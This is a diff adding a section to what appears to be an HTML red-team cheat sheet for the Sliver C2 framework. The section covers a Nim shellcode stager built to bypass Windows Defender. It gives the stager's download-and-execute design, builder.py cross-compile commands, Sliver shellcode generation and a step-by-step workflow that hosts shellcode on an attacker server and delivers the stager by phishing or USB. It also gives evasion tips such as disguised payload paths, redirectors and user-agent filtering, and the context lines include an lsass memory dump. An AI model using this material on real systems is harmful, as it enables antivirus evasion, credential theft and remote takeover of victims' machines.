@@ -484,3 +484,110 @@ sliver (system_beacon) > procdump --pid &lt;lsass_pid&gt; --save /tmp/lsass.dmp
 # procdump --pid &lt;pid&gt; --save &lt;file&gt;                    — dump process memory
 # socks5 start -P 1080                                  — start SOCKS5 proxy
 # pivots named-pipe --bind &lt;name&gt;                       — named pipe pivot listener</code></pre>
+
+  <h2>Defender Bypass — Nim Shellcode Stager</h2>
+  <p>A Nim-based shellcode stager bypasses Windows Defender by using the <code>winim</code> library to make Windows API calls without the telemetry signatures of common loaders. The stager downloads raw shellcode from a web server and executes it in-process. The <code>builder.py</code> script automates compilation from Linux.</p>
+
+  <h3>How the Stager Works</h3>
+  <pre><code># Architecture:
+# 1. Nim stager (stager.exe) runs on target
+# 2. Downloads shellc.bin from http://ATTACKER_IP:PORT/shellc.bin via httpclient
+# 3. Allocates RWX memory with VirtualAllocEx on current process handle
+# 4. Copies shellcode into the allocation with copyMem
+# 5. Casts pointer to proc() and calls it — executes Sliver shellcode in-process
+
+# Why Nim bypasses Defender:
+# - Nim compiles to C → minimal runtime, no CLR telemetry
+# - winim wraps Windows API via native bindings (not pinvoke signatures)
+# - No known shellcode loader signatures in the Nim → C → PE pipeline
+# - Stager has no embedded shellcode (fetches at runtime) → static scan misses payload</code></pre>
+
+  <h3>Builder Script Usage</h3>
+  <pre><code># Prerequisites (Debian/Kali):
+# - Python 3
+# - sudo privileges (installs mingw-w64 and nim if missing)
+# - Internet access (downloads winim library via nimble)
+
+# Run builder.py to generate stager.exe:
+python3 builder.py -l 192.168.1.5 -p 80
+
+# What builder.py does automatically:
+# 1. Writes stager.nim with IP/port embedded in download URL
+# 2. Checks for mingw-w64 (cross-compiler) — installs via apt if missing
+# 3. Checks for nim compiler — installs via apt if missing
+# 4. Runs: nimble install -y winim
+# 5. Cross-compiles stager.nim → stager.exe (Windows x64):
+#    nim c -d:mingw --os:windows --cpu:amd64
+#      --cc:gcc
+#      --gcc.exe:x86_64-w64-mingw32-gcc
+#      --gcc.linkerexe:x86_64-w64-mingw32-gcc
+#      stager.nim
+
+# Manual install (if builder fails):
+sudo apt install -y mingw-w64 nim
+nimble install -y winim</code></pre>
+
+  <h3>Sliver Shellcode Generation</h3>
+  <pre><code># In Sliver console — generate shellcode payload:
+generate --mtls 192.168.1.5:443 --os windows --arch amd64 --format shellcode
+
+# Rename output file (Sliver generates a random name):
+mv *.bin shellc.bin
+
+# Host shellc.bin on your web server:
+python3 -m http.server 80
+
+# The stager fetches: http://192.168.1.5:80/shellc.bin
+# Adjust -p flag to match the port python3 http.server is on
+
+# Alternative — use a proper C2 redirector or Sliver's built-in HTTP listener:
+# Generate with --http instead of --mtls for HTTP-based shellcode:
+generate --http 192.168.1.5:80 --os windows --arch amd64 --format shellcode</code></pre>
+
+  <h3>Full Workflow</h3>
+  <pre><code># Step 1: Start Sliver teamserver
+sliver-server
+
+# Step 2: Start HTTP/mTLS listener in Sliver
+sliver &gt; http -L 0.0.0.0 -l 443
+
+# Step 3: Generate shellcode
+sliver &gt; generate --mtls 192.168.1.5:443 --os windows --arch amd64 --format shellcode
+# [*] Implant saved to SOME_NAME.bin
+
+# Step 4: Rename and host shellcode
+mv SOME_NAME.bin shellc.bin
+python3 -m http.server 80
+
+# Step 5: Build stager.exe
+python3 builder.py -l 192.168.1.5 -p 80
+# [SUCCESS] stager.exe has been generated!
+
+# Step 6: Deliver stager.exe to target (phishing, USB, exploit)
+# Target executes stager.exe → downloads shellc.bin → Sliver session opens
+
+# Step 7: Interact with session in Sliver
+sliver &gt; sessions
+sliver &gt; use &lt;session_id&gt;
+[session] &gt; whoami
+[session] &gt; shell</code></pre>
+
+  <h3>Detection &amp; OPSEC</h3>
+  <pre><code># Detection vectors for this technique:
+# - Network: HTTP GET to /shellc.bin (predictable URL pattern)
+#   Mitigate: host shellcode at a random or disguised path (/images/logo.png)
+# - Memory: RWX allocation in current process (VirtualAllocEx PAGE_EXECUTE_READ_WRITE)
+#   Mitigate: allocate PAGE_READWRITE → copy → VirtualProtect PAGE_EXECUTE_READ
+# - Behavioral: process downloading a binary and immediately executing memory
+#   Mitigate: add sleep before allocation, use process injection into a remote PID
+# - Network: mTLS certificate fingerprinting (Sliver default cert is known)
+#   Mitigate: use custom TLS certificate and malleable C2 profile
+
+# Note: stager fetches shellcode over plain HTTP by default (port 80)
+# For operational use, serve shellc.bin over HTTPS with a valid cert:
+# Use caddy or nginx with Let's Encrypt certificate
+
+# OPSEC improvement — custom shellcode delivery:
+# Instead of python http.server, use a redirector:
+# nginx proxy_pass → teamserver (hides real server IP)
+# Apache mod_rewrite → only serve shellc.bin to known user-agents</code></pre>
